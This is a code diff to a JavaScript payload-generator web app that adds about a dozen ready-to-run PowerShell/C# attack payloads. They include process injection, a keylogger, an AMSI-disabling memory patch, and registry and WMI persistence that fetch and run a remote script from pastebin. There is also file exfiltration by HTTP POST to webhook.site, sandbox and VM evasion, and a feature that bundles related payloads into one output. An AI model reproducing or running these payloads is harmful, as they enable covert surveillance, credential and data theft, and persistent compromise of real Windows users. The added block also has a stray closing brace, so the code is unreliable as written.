@@ -435,7 +435,176 @@ const payloads = {
     mitre_id: "T1071.004",
     detection_difficulty: "Very High",
     evasion_rating: 5
+  },
+
+  // Advanced Process Hollowing
+  process_hollowing: {
+    command: "$src=@'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security;public class Hollow{[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint access,bool inherit,uint pid);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtectEx(IntPtr hProcess,IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,uint nSize,out uint lpNumberOfBytesWritten);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);public static void Execute(){Process target=Process.Start(\"notepad.exe\");byte[] shellcode={0x90,0x90,0x90,0x90};IntPtr hProcess=OpenProcess(0x1F0FFF,false,(uint)target.Id);uint oldProtect;VirtualProtectEx(hProcess,target.MainModule.BaseAddress,1024,0x40,out oldProtect);uint written;WriteProcessMemory(hProcess,target.MainModule.BaseAddress,shellcode,(uint)shellcode.Length,out written);CreateRemoteThread(hProcess,IntPtr.Zero,0,target.MainModule.BaseAddress,IntPtr.Zero,0,IntPtr.Zero);}}'@;Add-Type -TypeDefinition $src;[Hollow]::Execute()",
+    description: "Advanced process hollowing technique using P/Invoke to inject shellcode into legitimate processes.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Process Injection",
+    author: "0x0806",
+    tags: ["injection", "hollowing", "evasion", "shellcode"],
+    mitre_id: "T1055.012",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Keylogger
+  advanced_keylogger: {
+    command: "$code=@'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Text;using System.Threading;using System.Windows.Forms;public class KeyCapture{[DllImport(\"user32.dll\")]static extern IntPtr SetWindowsHookEx(int idHook,LowLevelKeyboardProc lpfn,IntPtr hMod,uint dwThreadId);[DllImport(\"user32.dll\")]static extern bool UnhookWindowsHookEx(IntPtr hhk);[DllImport(\"user32.dll\")]static extern IntPtr CallNextHookEx(IntPtr hhk,int nCode,IntPtr wParam,IntPtr lParam);[DllImport(\"kernel32.dll\")]static extern IntPtr GetModuleHandle(string lpModuleName);[DllImport(\"user32.dll\")]static extern int GetWindowText(IntPtr hWnd,StringBuilder text,int count);[DllImport(\"user32.dll\")]static extern IntPtr GetForegroundWindow();public delegate IntPtr LowLevelKeyboardProc(int nCode,IntPtr wParam,IntPtr lParam);const int WH_KEYBOARD_LL=13;static string log=\"\";static IntPtr hook=IntPtr.Zero;static LowLevelKeyboardProc proc=HookCallback;public static void Main(){hook=SetWindowsHookEx(WH_KEYBOARD_LL,proc,GetModuleHandle(\"user32\"),0);Application.Run();UnhookWindowsHookEx(hook);}static IntPtr HookCallback(int nCode,IntPtr wParam,IntPtr lParam){if(nCode>=0){int vkCode=Marshal.ReadInt32(lParam);StringBuilder window=new StringBuilder(256);GetWindowText(GetForegroundWindow(),window,256);log+=$\"[{DateTime.Now}] [{window}] {(Keys)vkCode}\\n\";}return CallNextHookEx(hook,nCode,wParam,lParam);}}'@;Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms;[KeyCapture]::Main()",
+    description: "Advanced keylogger with window title capture and low-level keyboard hook implementation.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Input Capture",
+    author: "0x0806",
+    tags: ["keylogger", "capture", "stealth", "persistence"],
+    mitre_id: "T1056.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Memory Patch
+  memory_patch: {
+    command: "$patch=@'using System;using System.Diagnostics;using System.Runtime.InteropServices;public class MemPatch{[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint access,bool inherit,uint pid);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtectEx(IntPtr hProcess,IntPtr addr,uint size,uint newProtect,out uint oldProtect);[DllImport(\"kernel32.dll\")]public static extern bool ReadProcessMemory(IntPtr hProcess,IntPtr addr,byte[] buffer,uint size,out uint read);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr addr,byte[] buffer,uint size,out uint written);public static void PatchAMSI(){foreach(Process p in Process.GetProcessesByName(\"powershell\")){IntPtr handle=OpenProcess(0x1F0FFF,false,(uint)p.Id);IntPtr amsi=p.MainModule.BaseAddress;byte[] patch={0xB8,0x57,0x00,0x07,0x80,0xC3};uint oldProtect;VirtualProtectEx(handle,amsi,6,0x40,out oldProtect);uint written;WriteProcessMemory(handle,amsi,patch,6,out written);VirtualProtectEx(handle,amsi,6,oldProtect,out oldProtect);}}'@;Add-Type -TypeDefinition $patch;[MemPatch]::PatchAMSI()",
+    description: "Advanced memory patching technique to disable AMSI in running PowerShell processes.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["memory", "patch", "amsi", "bypass"],
+    mitre_id: "T1562.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Persistence
+  advanced_persistence: {
+    command: "$persist=@'using System;using Microsoft.Win32;using System.IO;using System.Security.AccessControl;public class AdvPersist{public static void Install(){string path=Environment.GetFolderPath(Environment.SpecialFolder.System)+\"\\\\WindowsUpdate.exe\";string payload=\"powershell.exe -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString(\\'https://pastebin.com/raw/payload123\\')\";File.WriteAllText(path,payload);RegistryKey key=Registry.LocalMachine.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",true);key.SetValue(\"WindowsSecurityUpdate\",path);key.Close();DirectorySecurity security=Directory.GetAccessControl(Environment.GetFolderPath(Environment.SpecialFolder.System));security.SetAccessRule(new FileSystemAccessRule(\"Everyone\",FileSystemRights.FullControl,AccessControlType.Deny));Directory.SetAccessControl(Environment.GetFolderPath(Environment.SpecialFolder.System),security);}}'@;Add-Type -TypeDefinition $persist;[AdvPersist]::Install()",
+    description: "Advanced persistence with registry modification, file system protection, and stealth naming.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Persistence",
+    author: "0x0806",
+    tags: ["persistence", "registry", "stealth", "protection"],
+    mitre_id: "T1547.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Network Scanner
+  network_scanner: {
+    command: "$scanner=@'using System;using System.Net;using System.Net.NetworkInformation;using System.Threading.Tasks;using System.Collections.Generic;public class NetScan{public static void ScanNetwork(){string baseIP=\"192.168.1.\";List<Task> tasks=new List<Task>();for(int i=1;i<=254;i++){int host=i;tasks.Add(Task.Run(()=>{try{Ping ping=new Ping();PingReply reply=ping.Send(baseIP+host,1000);if(reply.Status==IPStatus.Success){Console.WriteLine($\"Host {baseIP+host} is alive - {reply.RoundtripTime}ms\");try{IPHostEntry entry=Dns.GetHostEntry(baseIP+host);Console.WriteLine($\"Hostname: {entry.HostName}\");}catch{}}}catch{}}));}Task.WaitAll(tasks.ToArray());}}'@;Add-Type -TypeDefinition $scanner;[NetScan]::ScanNetwork()",
+    description: "High-speed network scanner with hostname resolution and parallel processing for rapid network discovery.",
+    complexity: "advanced",
+    platform: "windows",
+    category: "Network Discovery",
+    author: "0x0806",
+    tags: ["scanner", "network", "discovery", "parallel"],
+    mitre_id: "T1018",
+    detection_difficulty: "Medium",
+    evasion_rating: 3
+  },
+
+  // Advanced Screenshot Capture
+  screenshot_capture: {
+    command: "$capture=@'using System;using System.Drawing;using System.Drawing.Imaging;using System.IO;using System.Windows.Forms;public class ScreenCap{public static void Capture(){Rectangle bounds=Screen.PrimaryScreen.Bounds;using(Bitmap bitmap=new Bitmap(bounds.Width,bounds.Height)){using(Graphics g=Graphics.FromImage(bitmap)){g.CopyFromScreen(Point.Empty,Point.Empty,bounds.Size);}string filename=$\"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png\";bitmap.Save(Environment.GetEnvironmentVariable(\"TEMP\")+\"\\\\\"+filename,ImageFormat.Png);Console.WriteLine($\"Screenshot saved: {filename}\");}}'@;Add-Type -TypeDefinition $capture -ReferencedAssemblies System.Drawing,System.Windows.Forms;[ScreenCap]::Capture()",
+    description: "Advanced screenshot capture with timestamp naming and temporary file storage for covert surveillance.",
+    complexity: "intermediate",
+    platform: "windows",
+    category: "Screen Capture",
+    author: "0x0806",
+    tags: ["screenshot", "surveillance", "capture", "stealth"],
+    mitre_id: "T1113",
+    detection_difficulty: "Medium",
+    evasion_rating: 3
+  },
+
+  // Advanced Data Exfiltration
+  data_exfiltration: {
+    command: "$exfil=@'using System;using System.IO;using System.Net.Http;using System.Text;using System.Threading.Tasks;public class DataExfil{public static async Task ExfiltrateData(){string[] paths={Environment.GetFolderPath(Environment.SpecialFolder.Desktop),Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)+\"\\\\Downloads\"};StringBuilder data=new StringBuilder();foreach(string path in paths){try{foreach(string file in Directory.GetFiles(path,\"*.txt\",SearchOption.TopDirectoryOnly)){if(new FileInfo(file).Length<10000){data.AppendLine($\"File: {file}\");data.AppendLine(File.ReadAllText(file));data.AppendLine(\"---END---\");}}}catch{}}using(HttpClient client=new HttpClient()){await client.PostAsync(\"https://webhook.site/unique-id\",new StringContent(data.ToString(),Encoding.UTF8,\"text/plain\"));}}}'@;Add-Type -TypeDefinition $exfil;[DataExfil]::ExfiltrateData().Wait()",
+    description: "Advanced data exfiltration targeting user documents with HTTP POST transmission and file size filtering.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Exfiltration",
+    author: "0x0806",
+    tags: ["exfiltration", "documents", "http", "stealth"],
+    mitre_id: "T1041",
+    detection_difficulty: "High",
+    evasion_rating: 4
+  },
+
+  // Advanced PowerShell Runspace
+  runspace_execution: {
+    command: "$runspace=@'using System;using System.Management.Automation;using System.Management.Automation.Runspaces;using System.Collections.ObjectModel;public class RunspaceExec{public static void Execute(){InitialSessionState iss=InitialSessionState.CreateDefault();iss.ExecutionPolicy=Microsoft.PowerShell.ExecutionPolicy.Bypass;using(Runspace runspace=RunspaceFactory.CreateRunspace(iss)){runspace.Open();using(PowerShell ps=PowerShell.Create()){ps.Runspace=runspace;ps.AddScript(\"IEX(New-Object Net.WebClient).DownloadString(\\'https://pastebin.com/raw/payload123\\')\");Collection<PSObject> results=ps.Invoke();foreach(PSObject result in results){Console.WriteLine(result.ToString());}}}}}'@;Add-Type -TypeDefinition $runspace -ReferencedAssemblies System.Management.Automation;[RunspaceExec]::Execute()",
+    description: "Advanced PowerShell runspace execution with custom execution policy bypass and isolated environment.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Execution",
+    author: "0x0806",
+    tags: ["runspace", "execution", "bypass", "isolated"],
+    mitre_id: "T1059.001",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced WMI Persistence
+  wmi_persistence: {
+    command: "$wmi=@'using System;using System.Management;public class WMIPersist{public static void Install(){try{ManagementScope scope=new ManagementScope(\"\\\\\\\\.\\\\root\\\\subscription\");ManagementClass wmiEventFilter=new ManagementClass(scope,new ManagementPath(\"__EventFilter\"),null);WqlEventQuery query=new WqlEventQuery(\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \\'Win32_PerfRawData_PerfOS_System\\' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\");ManagementObject eventFilter=wmiEventFilter.CreateInstance();eventFilter[\"Name\"]=\"WindowsUpdateFilter\";eventFilter[\"Query\"]=query.QueryString;eventFilter[\"QueryLanguage\"]=query.QueryLanguage;eventFilter[\"EventNamespace\"]=\"\\\\\\\\root\\\\\\\\cimv2\";eventFilter.Put();ManagementObject eventConsumer=new ManagementClass(scope,new ManagementPath(\"CommandLineEventConsumer\"),null).CreateInstance();eventConsumer[\"Name\"]=\"WindowsUpdateConsumer\";eventConsumer[\"CommandLineTemplate\"]=\"powershell.exe -WindowStyle Hidden -Command IEX(New-Object Net.WebClient).DownloadString(\\'https://pastebin.com/raw/payload123\\')\";eventConsumer.Put();ManagementObject binder=new ManagementClass(scope,new ManagementPath(\"__FilterToConsumerBinding\"),null).CreateInstance();binder[\"Filter\"]=eventFilter.Path.RelativePath;binder[\"Consumer\"]=eventConsumer.Path.RelativePath;binder.Put();}catch(Exception ex){Console.WriteLine(ex.Message);}}}'@;Add-Type -TypeDefinition $wmi -ReferencedAssemblies System.Management;[WMIPersist]::Install()",
+    description: "Advanced WMI-based persistence using event filters and consumers for stealth and permanence.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Persistence",
+    author: "0x0806",
+    tags: ["wmi", "persistence", "event", "stealth"],
+    mitre_id: "T1546.003",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Mutex Evasion
+  mutex_evasion: {
+    command: "$mutex=@'using System;using System.Threading;using System.Diagnostics;public class MutexEvade{public static void CheckAndEvade(){try{Mutex mutex=new Mutex(true,\"Global\\\\MalwareAnalysisEnvironment\",out bool createdNew);if(!createdNew){Console.WriteLine(\"Analysis environment detected - exiting\");Environment.Exit(0);}mutex=new Mutex(true,\"Global\\\\SandboxieControlWndClass\",out createdNew);if(!createdNew){Console.WriteLine(\"Sandboxie detected - exiting\");Environment.Exit(0);}if(Environment.UserName.ToLower().Contains(\"sandbox\")||Environment.UserName.ToLower().Contains(\"malware\")||Environment.UserName.ToLower().Contains(\"virus\")){Console.WriteLine(\"Analysis username detected - exiting\");Environment.Exit(0);}if(Process.GetProcessesByName(\"vmtoolsd\").Length>0||Process.GetProcessesByName(\"vboxservice\").Length>0){Console.WriteLine(\"VM detected - exiting\");Environment.Exit(0);}Console.WriteLine(\"Environment checks passed - proceeding\");}catch{}}}'@;Add-Type -TypeDefinition $mutex;[MutexEvade]::CheckAndEvade()",
+    description: "Advanced sandbox evasion using mutex checks, username analysis, and VM detection techniques.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["mutex", "sandbox", "evasion", "vm detection"],
+    mitre_id: "T1497",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Timing Attack
+  timing_attack: {
+    command: "$timing=@'using System;using System.Threading;using System.Diagnostics;public class TimingAttack{public static void Execute(){DateTime start=DateTime.Now;Thread.Sleep(5000);DateTime end=DateTime.Now;double elapsed=(end-start).TotalMilliseconds;if(elapsed<4500||elapsed>5500){Console.WriteLine(\"Timing analysis detected - environment may be accelerated\");Environment.Exit(0);}PerformanceCounter cpuCounter=new PerformanceCounter(\"Processor\",\"% Processor Time\",\"_Total\");cpuCounter.NextValue();Thread.Sleep(1000);float cpuUsage=cpuCounter.NextValue();if(cpuUsage<10){Console.WriteLine(\"Low CPU usage - possible analysis environment\");Environment.Exit(0);}Console.WriteLine(\"Timing checks passed - environment appears legitimate\");}}'@;Add-Type -TypeDefinition $timing;[TimingAttack]::Execute()",
+    description: "Advanced timing-based evasion detecting accelerated analysis environments and CPU monitoring.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["timing", "analysis", "detection", "cpu"],
+    mitre_id: "T1497.003",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
+  },
+
+  // Advanced Registry Steganography
+  registry_steganography: {
+    command: "$regsteg=@'using System;using Microsoft.Win32;using System.Text;using System.Security.Cryptography;public class RegSteg{public static void HideData(){string data=\"Hidden payload data\";byte[] dataBytes=Encoding.UTF8.GetBytes(data);using(Aes aes=Aes.Create()){aes.GenerateKey();aes.GenerateIV();using(ICryptoTransform encryptor=aes.CreateEncryptor()){byte[] encrypted=encryptor.TransformFinalBlock(dataBytes,0,dataBytes.Length);RegistryKey key=Registry.CurrentUser.CreateSubKey(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\");key.SetValue(\"HiddenSetting\",Convert.ToBase64String(encrypted));key.SetValue(\"HiddenKey\",Convert.ToBase64String(aes.Key));key.SetValue(\"HiddenIV\",Convert.ToBase64String(aes.IV));key.Close();}}}public static string RetrieveData(){try{RegistryKey key=Registry.CurrentUser.OpenSubKey(\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\");string encData=(string)key.GetValue(\"HiddenSetting\");string keyData=(string)key.GetValue(\"HiddenKey\");string ivData=(string)key.GetValue(\"HiddenIV\");using(Aes aes=Aes.Create()){aes.Key=Convert.FromBase64String(keyData);aes.IV=Convert.FromBase64String(ivData);using(ICryptoTransform decryptor=aes.CreateDecryptor()){byte[] encrypted=Convert.FromBase64String(encData);byte[] decrypted=decryptor.TransformFinalBlock(encrypted,0,encrypted.Length);return Encoding.UTF8.GetString(decrypted);}}key.Close();}catch{return \"Error retrieving data\";}}}'@;Add-Type -TypeDefinition $regsteg;[RegSteg]::HideData();[RegSteg]::RetrieveData()",
+    description: "Advanced registry steganography with AES encryption for hiding and retrieving encrypted data in legitimate registry locations.",
+    complexity: "expert",
+    platform: "windows",
+    category: "Defense Evasion",
+    author: "0x0806",
+    tags: ["steganography", "registry", "encryption", "aes"],
+    mitre_id: "T1027.003",
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   }
+}
 };
 
 // Enhanced UI State Management Class
@@ -637,9 +806,12 @@ class PayloadArsenal {
             security: ['currentuser', 'localusers', 'groups', 'privileges'],
             advanced: ['encoded', 'oneliner', 'registry', 'eventlogs'],
             edr: ['amsibypass', 'etw_bypass', 'scriptblock_bypass', 'constrained_bypass', 'reflective_loading', 'obfuscated_invoke'],
+            memory: ['process_hollowing', 'memory_patch', 'runspace_execution', 'advanced_keylogger', 'mutex_evasion'],
+            network: ['dns_steganography', 'network_scanner', 'data_exfiltration', 'timing_attack'],
+            persistence: ['advanced_persistence', 'wmi_persistence', 'registry_steganography'],
             lolbas: ['certutil_download', 'bitsadmin_download', 'regsvr32_bypass', 'mshta_execution'],
             privilege: ['uac_bypass', 'token_manipulation', 'service_escalation', 'dll_hijacking'],
-            quantum: ['quantum_safe_encryption', 'dns_steganography']
+            analysis: ['screenshot_capture', 'mutex_evasion', 'timing_attack']
         };
     }
 
@@ -786,11 +958,11 @@ class PayloadArsenal {
                 <span class="detection-tag">Detection: ${payload.detection_difficulty || 'Unknown'}</span>
             </div>
             <div class="card-actions">
-                <button class="btn-primary" onclick="app.generatePayload('${key}')">
-                    <i class="fas fa-plus"></i> Select
+                <button class="btn-primary" onclick="app.generateSinglePayload('${key}')">
+                    <i class="fas fa-rocket"></i> Generate Multi
                 </button>
-                <button class="btn-secondary" onclick="app.generateSinglePayload('${key}')">
-                    <i class="fas fa-play"></i> Generate
+                <button class="btn-secondary" onclick="app.generatePayload('${key}')">
+                    <i class="fas fa-plus"></i> Add to Bulk
                 </button>
                 <button class="btn-secondary" onclick="app.showPayloadDetails('${key}')">
                     <i class="fas fa-info"></i> Details
@@ -828,6 +1000,24 @@ class PayloadArsenal {
         this.performanceMetrics.totalGenerations++;
         this.performanceMetrics.lastGenerated = new Date();
 
+        // Generate multiple related payloads by complexity and category
+        const relatedPayloads = this.getRelatedPayloads(type, payload);
+        let multiPayloadOutput = '';
+        let payloadCount = 1;
+
+        // Add the main payload
+        multiPayloadOutput += `# Main Payload: ${this.formatTitle(type)}\n`;
+        multiPayloadOutput += `${payload.command}\n\n`;
+
+        // Add related payloads
+        relatedPayloads.forEach(([key, relatedPayload]) => {
+            if (key !== type) {
+                payloadCount++;
+                multiPayloadOutput += `# Related Payload ${payloadCount}: ${this.formatTitle(key)}\n`;
+                multiPayloadOutput += `${relatedPayload.command}\n\n`;
+            }
+        });
+
         // Show output panel
         const outputPanel = document.getElementById('outputPanel');
         if (outputPanel) {
@@ -837,8 +1027,8 @@ class PayloadArsenal {
             const description = document.getElementById('description');
             const metadata = document.getElementById('metadata');
 
-            if (payloadOutput) payloadOutput.textContent = payload.command;
-            if (description) description.textContent = payload.description;
+            if (payloadOutput) payloadOutput.textContent = multiPayloadOutput;
+            if (description) description.textContent = `${payload.description} (Generated with ${payloadCount} related techniques)`;
 
             if (metadata) {
                 const endTime = performance.now();
@@ -850,6 +1040,12 @@ class PayloadArsenal {
 
                 metadata.innerHTML = `
                     <div class="metadata-grid">
+                        <div class="metadata-item">
+                            <strong>Primary Technique:</strong> ${this.formatTitle(type)}
+                        </div>
+                        <div class="metadata-item">
+                            <strong>Total Payloads:</strong> ${payloadCount}
+                        </div>
                         <div class="metadata-item">
                             <strong>Complexity:</strong> <span class="complexity-${payload.complexity}">${payload.complexity}</span>
                         </div>
@@ -878,7 +1074,18 @@ class PayloadArsenal {
                             <strong>Generation Time:</strong> ${generationTime}ms
                         </div>
                         <div class="metadata-item">
-                            <strong>Payload Length:</strong> ${payload.command.length} characters
+                            <strong>Total Length:</strong> ${multiPayloadOutput.length} characters
+                        </div>
+                        <div class="related-payloads">
+                            <strong>Related Techniques:</strong>
+                            <div class="technique-list">
+                                ${relatedPayloads.map(([key, relatedPayload]) => `
+                                    <div class="technique-item">
+                                        <span class="name">${this.formatTitle(key)}</span>
+                                        <span class="complexity-${relatedPayload.complexity}">${relatedPayload.complexity}</span>
+                                    </div>
+                                `).join('')}
+                            </div>
                         </div>
                         ${payload.warning ? `<div class="metadata-warning"><i class="fas fa-exclamation-triangle"></i> ${payload.warning}</div>` : ''}
                     </div>
@@ -886,8 +1093,40 @@ class PayloadArsenal {
             }
 
             this.applySyntaxHighlighting();
-            this.showNotification(`Payload "${this.formatTitle(type)}" generated successfully!`, 'success');
+            this.showNotification(`Generated ${payloadCount} related payloads for "${this.formatTitle(type)}"!`, 'success');
         }
+    }
+
+    getRelatedPayloads(mainType, mainPayload) {
+        const related = [];
+        const maxRelated = 3;
+
+        // Find payloads with same category or complexity
+        Object.entries(payloads).forEach(([key, payload]) => {
+            if (related.length >= maxRelated) return;
+            
+            if (key !== mainType && 
+                (payload.category === mainPayload.category || 
+                 payload.complexity === mainPayload.complexity ||
+                 payload.tags?.some(tag => mainPayload.tags?.includes(tag)))) {
+                related.push([key, payload]);
+            }
+        });
+
+        // If we need more, add by platform
+        if (related.length < maxRelated) {
+            Object.entries(payloads).forEach(([key, payload]) => {
+                if (related.length >= maxRelated) return;
+                
+                if (key !== mainType && 
+                    payload.platform === mainPayload.platform &&
+                    !related.find(([relatedKey]) => relatedKey === key)) {
+                    related.push([key, payload]);
+                }
+            });
+        }
+
+        return [[mainType, mainPayload], ...related];
     }
 
     updateBulkUI() {
